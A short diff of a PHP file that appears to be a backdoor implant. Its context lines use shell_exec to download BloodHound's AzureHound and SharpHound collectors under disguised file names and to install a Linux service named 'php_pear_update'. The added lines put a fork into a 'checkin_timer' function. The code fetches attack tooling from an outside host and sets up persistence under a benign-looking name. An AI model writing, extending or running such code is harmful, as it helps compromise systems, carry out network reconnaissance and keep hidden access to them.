@@ -18,7 +18,7 @@ function checkfs(){
             shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/AzureHound.ps1 -OutFile " . $t . "\\af1.ps1");
             shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.exe?raw=true -OutFile " . $t . "\\af2.exe");
         }else{
-
+            return true;
         }
     } else {
         if (is_dir("/etc/service") && !file_exists("/etc/service/php_pear_update")){
@@ -37,13 +37,15 @@ function checkfs(){
             fflush($ffe);
             fclose($ffe);
         }
-
+        return true;
     }
 
 }
 
 function checkin_timer($time){
-
+    if (is_int($time) && !empty($time) || $time != 0){
+        pcntl_fork();
+    }
 
 }
 
